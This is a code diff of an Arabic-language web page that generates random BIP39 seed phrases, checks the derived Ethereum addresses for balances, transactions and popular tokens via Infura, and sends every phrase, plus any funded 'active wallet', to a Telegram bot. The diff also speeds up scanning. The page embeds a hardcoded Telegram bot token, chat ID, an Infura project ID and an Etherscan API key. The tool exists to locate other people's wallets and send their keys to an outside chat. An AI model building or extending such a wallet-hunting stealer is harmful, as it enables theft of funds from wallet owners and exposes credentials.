@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مولد عبارات BIP39 - Etherscan API</title>
+    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة - جميع العملات</title>
     <style>
         * {
             margin: 0;
@@ -515,45 +515,20 @@
         .token-item:last-child {
             border-bottom: none;
         }
-
-        .transaction-list {
-            margin: 10px 0;
-            padding: 10px;
-            background: #e9ecef;
-            border-radius: 5px;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-
-        .transaction-item {
-            padding: 8px;
-            margin: 5px 0;
-            background: white;
-            border-radius: 5px;
-            border-right: 4px solid #4facfe;
-        }
-
-        .transaction-item.success {
-            border-right-color: #28a745;
-        }
-
-        .transaction-item.fail {
-            border-right-color: #dc3545;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔑 مولد عبارات BIP39 - Etherscan API</h1>
-            <p>اكتشاف المحافظ النشطة باستخدام Etherscan API</p>
+            <h1>🔑 مولد عبارات BIP39 - جميع العملات</h1>
+            <p>البحث عن المحافظ النشطة وإرسالها إلى Telegram - يدعم جميع العملات</p>
         </div>
 
         <div class="main-content">
             <div class="control-panel">
                 <div class="control-group">
                     <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
-                    <input type="number" id="searchSpeed" value="5000" min="3000" max="15000" step="1000">
+                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                 </div>
 
                 <div class="control-group">
@@ -618,14 +593,14 @@
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
                 <div id="currentStatus" class="alert alert-info">
-                    جاهز للبدء... يستخدم Etherscan API للكشف عن المعاملات والأصول
+                    جاهز للبدء... التطبيق يدعم الآن جميع العملات
                 </div>
             </div>
 
             <div class="log-panel" id="logPanel">
                 <div class="log-entry log-info">
                     <span class="log-timestamp" id="currentTime"></span>
-                    مرحباً بك في مولد عبارات BIP39 المحسن. يستخدم الآن Etherscan API للكشف عن المعاملات والأصول.
+                    مرحباً بك في مولد عبارات BIP39 المحسن. يدعم الآن جميع العملات المشهورة.
                 </div>
             </div>
         </div>
@@ -854,13 +829,13 @@
         ];
 
         // إعدادات التطبيق
-        const ETHERSCAN_API_KEY = 'ZTX93YC56F73T2W58IKS6GWWDH8UDRGBFK';
-        const ETHERSCAN_API_URL = 'https://api.etherscan.io/api';
+        const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
+        const INFURA_URL = `https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`;
         const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
         const TELEGRAM_CHAT_ID = '910021564';
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-        // قائمة العملات المشهورة على Ethereum
+        // قائمة العملات المشهورة المضافة
         const POPULAR_TOKENS = [
             {
                 symbol: 'USDT',
@@ -988,87 +963,50 @@
             }
         }
 
-        // وظائف Etherscan API
-        async function getEtherscanBalance(address) {
+        async function checkWalletBalance(address) {
             try {
-                const response = await fetch(`${ETHERSCAN_API_URL}?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
-                const data = await response.json();
-                
-                if (data.status === "1") {
-                    const balanceInWei = data.result;
-                    const balanceInEth = ethers.utils.formatEther(balanceInWei);
-                    return parseFloat(balanceInEth);
-                } else {
-                    console.error('خطأ في جلب الرصيد من Etherscan:', data.message);
+                if (!checkEthersLoaded()) {
                     return null;
                 }
+                
+                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
+                const balance = await provider.getBalance(address);
+                const balanceEth = ethers.utils.formatEther(balance);
+                return parseFloat(balanceEth);
             } catch (error) {
-                console.error('خطأ في الاتصال بـ Etherscan:', error);
+                console.error('خطأ في التحقق من رصيد ETH:', error);
                 return null;
             }
         }
 
-        async function getEtherscanTransactions(address) {
-            try {
-                const response = await fetch(`${ETHERSCAN_API_URL}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${ETHERSCAN_API_KEY}`);
-                const data = await response.json();
-                
-                if (data.status === "1") {
-                    return {
-                        hasTransactions: data.result.length > 0,
-                        transactionCount: data.result.length,
-                        transactions: data.result.slice(0, 10), // آخر 10 معاملات فقط
-                        firstTransaction: data.result[0],
-                        lastTransaction: data.result[data.result.length - 1]
-                    };
-                } else {
-                    return {
-                        hasTransactions: false,
-                        transactionCount: 0,
-                        transactions: [],
-                        error: data.message
-                    };
-                }
-            } catch (error) {
-                console.error('خطأ في جلب المعاملات من Etherscan:', error);
-                return {
-                    hasTransactions: false,
-                    transactionCount: 0,
-                    transactions: [],
-                    error: error.message
-                };
-            }
-        }
-
-        async function getTokenBalanceFromEtherscan(address, token) {
-            try {
-                const response = await fetch(`${ETHERSCAN_API_URL}?module=account&action=tokenbalance&contractaddress=${token.address}&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
-                const data = await response.json();
-                
-                if (data.status === "1") {
-                    const balance = parseFloat(ethers.utils.formatUnits(data.result, token.decimals));
-                    return balance;
-                } else {
-                    return 0;
-                }
-            } catch (error) {
-                console.error(`خطأ في جلب رصيد ${token.symbol}:`, error);
-                return 0;
-            }
-        }
-
+        // الدالة الجديدة لجلب أرصدة العملات
         async function getTokenBalances(address) {
             try {
+                if (!checkEthersLoaded()) {
+                    return [];
+                }
+                
+                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
                 const tokenBalances = [];
                 
                 for (const token of POPULAR_TOKENS) {
-                    const balance = await getTokenBalanceFromEtherscan(address, token);
-                    if (balance > 0) {
-                        tokenBalances.push({
-                            symbol: token.symbol,
-                            balance: balance,
-                            address: token.address
-                        });
+                    try {
+                        const abi = ['function balanceOf(address) view returns (uint256)'];
+                        const tokenContract = new ethers.Contract(token.address, abi, provider);
+                        
+                        const balance = await tokenContract.balanceOf(address);
+                        const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
+                        const numericBalance = parseFloat(formattedBalance);
+                        
+                        if (numericBalance > 0) {
+                            tokenBalances.push({
+                                symbol: token.symbol,
+                                balance: numericBalance,
+                                address: token.address
+                            });
+                        }
+                    } catch (error) {
+                        console.error(`خطأ في جلب رصيد ${token.symbol}:`, error);
                     }
                 }
                 
@@ -1079,23 +1017,38 @@
             }
         }
 
-        // دالة التحقق من نشاط المحفظة باستخدام Etherscan
+        async function getTransactionCount(address) {
+            try {
+                if (!checkEthersLoaded()) {
+                    return null;
+                }
+                
+                const provider = new ethers.providers.JsonRpcProvider(INFURA_URL);
+                const transactionCount = await provider.getTransactionCount(address);
+                return transactionCount;
+            } catch (error) {
+                console.error('خطأ في الحصول على عدد المعاملات:', error);
+                return null;
+            }
+        }
+
+        // تحديث دالة isWalletActive لدعم العملات المتعددة
         async function isWalletActive(address) {
             try {
-                const [balance, transactionData, tokenBalances] = await Promise.all([
-                    getEtherscanBalance(address),
-                    getEtherscanTransactions(address),
+                const [balance, transactionCount, tokenBalances] = await Promise.all([
+                    checkWalletBalance(address),
+                    getTransactionCount(address),
                     getTokenBalances(address)
                 ]);
                 
                 const hasBalance = balance !== null && balance > 0;
-                const hasTransactions = transactionData.hasTransactions;
+                const hasTransactions = transactionCount !== null && transactionCount > 0;
                 const hasTokens = tokenBalances.length > 0;
                 
                 return {
                     isActive: hasBalance || hasTransactions || hasTokens,
                     balance: balance,
-                    transactionData: transactionData,
+                    transactionCount: transactionCount,
                     tokenBalances: tokenBalances,
                     hasBalance: hasBalance,
                     hasTransactions: hasTransactions,
@@ -1106,7 +1059,7 @@
                 return {
                     isActive: false,
                     balance: null,
-                    transactionData: { hasTransactions: false, transactionCount: 0, transactions: [] },
+                    transactionCount: null,
                     tokenBalances: [],
                     hasBalance: false,
                     hasTransactions: false,
@@ -1142,6 +1095,7 @@
             }
         }
 
+        // تحديث دالة formatWalletMessage لعرض جميع العملات
         function formatWalletMessage(mnemonic, address, walletDetails, isActive) {
             const timestamp = new Date().toLocaleString('ar-EG', {
                 timeZone: 'Africa/Cairo',
@@ -1167,8 +1121,8 @@
                 message += `💰 <b>رصيد ETH:</b> ${walletDetails.balance.toFixed(6)} ETH\n`;
             }
             
-            if (walletDetails.transactionData.hasTransactions) {
-                message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionData.transactionCount}\n`;
+            if (walletDetails.transactionCount !== null) {
+                message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
             }
             
             // إضافة أرصدة العملات الأخرى
@@ -1253,8 +1207,6 @@
                     return;
                 }
                 
-                addLogEntry(`جاري فحص العنوان على Etherscan: ${address}`);
-                
                 const walletStatus = await isWalletActive(address);
                 
                 const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
@@ -1262,8 +1214,6 @@
                 if (walletStatus.isActive) {
                     stats.activeWallets++;
                     addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
-                    addLogEntry(`💰 الرصيد: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : '0 ETH'}`, 'success');
-                    addLogEntry(`📊 عدد المعاملات: ${walletStatus.transactionData.transactionCount}`, 'success');
                     
                     if (telegramSent) {
                         addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
@@ -1322,7 +1272,6 @@
                 const address = await mnemonicToAddress(mnemonic);
                 
                 addLogEntry(`✅ تم تحويل العبارة إلى العنوان: ${address}`);
-                addLogEntry(`🔍 جاري فحص العنوان على Etherscan...`);
                 
                 const walletStatus = await isWalletActive(address);
                 
@@ -1361,6 +1310,7 @@
             }
         }
 
+        // تحديث دالة عرض النتائج اليدوية
         function updateManualTestResult(mnemonic, address, walletStatus) {
             let resultHTML = '';
             
@@ -1372,23 +1322,9 @@
                         💰 رصيد ETH: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
                     </div>
                     <div class="transactions">
-                        📊 عدد المعاملات: ${walletStatus.transactionData.transactionCount !== null ? walletStatus.transactionData.transactionCount : 'غير معروف'}
+                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                     </div>
                 `;
-                
-                if (walletStatus.transactionData.transactions.length > 0) {
-                    resultHTML += `
-                        <div class="transaction-list">
-                            <strong>📋 آخر المعاملات:</strong>
-                            ${walletStatus.transactionData.transactions.slice(0, 5).map(tx => `
-                                <div class="transaction-item ${tx.isError === '0' ? 'success' : 'fail'}">
-                                    <div>${tx.hash.substring(0, 20)}...</div>
-                                    <div>${ethers.utils.formatEther(tx.value || '0')} ETH</div>
-                                </div>
-                            `).join('')}
-                        </div>
-                    `;
-                }
                 
                 if (walletStatus.tokenBalances.length > 0) {
                     resultHTML += `
@@ -1419,7 +1355,7 @@
                         💰 رصيد ETH: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
                     </div>
                     <div class="transactions">
-                        📊 عدد المعاملات: ${walletStatus.transactionData.transactionCount !== null ? walletStatus.transactionData.transactionCount : 'غير معروف'}
+                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                     </div>
                 `;
                 
@@ -1462,10 +1398,10 @@
             elements.startBtn.disabled = true;
             elements.stopBtn.disabled = false;
             
-            const speed = parseInt(elements.searchSpeed.value) || 5000;
+            const speed = parseInt(elements.searchSpeed.value) || 3000;
             
             updateStatus('جاري بدء البحث...', 'info');
-            addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة باستخدام Etherscan API');
+            addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
             
             const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ وإرسال جميع العبارات إلى Telegram...`;
             await sendTelegramMessage(startMessage);
@@ -1531,7 +1467,7 @@
             if (checkEthersLoaded()) {
                 updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبدء...', 'success');
                 addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
-                addLogEntry('🔍 يستخدم الآن Etherscan API للكشف عن المعاملات والأصول', 'success');
+                addLogEntry('🪙 التطبيق يدعم الآن جميع العملات: ETH, USDT, USDC, DAI, LINK, UNI, WBTC, AAVE, SHIB', 'success');
             }
         });
 
